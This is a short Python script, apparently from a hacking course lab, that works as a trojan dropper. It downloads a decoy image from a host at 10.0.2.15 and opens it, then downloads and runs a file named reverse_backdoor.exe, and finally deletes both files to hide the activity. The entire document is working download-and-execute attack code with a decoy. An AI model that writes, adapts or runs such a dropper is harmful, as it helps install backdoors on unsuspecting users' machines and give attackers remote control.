#!/usr/bin/env python
import requests
import subprocess
import os, tempfile

def download_file(url):
    get_reponse = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name , "wb") as out_file:
        out_file.write(get_reponse.content)

temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)

download_file("http://10.0.2.15/evilfiles/wallpaper.jpg")
subprocess.Popen("wallpaper.jpg", shell=True)

download_file("http://10.0.2.15/evilfiles/reverse_backdoor.exe")
subprocess.call("reverse_backdoor.exe", shell=True)

os.remove("wallpaper.jpg")
os.remove("reverse_backdoor.exe")
